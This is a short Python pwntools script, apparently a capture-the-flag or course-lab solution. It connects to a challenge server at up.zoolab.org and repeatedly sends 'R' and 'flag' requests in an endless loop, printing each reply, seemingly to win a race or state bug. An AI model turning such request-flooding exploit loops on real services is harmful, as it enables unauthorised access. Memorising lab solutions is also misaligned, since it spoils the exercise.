from pwn import *

conn = remote('up.zoolab.org', 10931)

def exploit():
    while True:
        conn.sendline(b'R')
        response = conn.recvline()
        conn.sendline(b'flag')
        response = conn.recvline()
        print(response)

exploit()
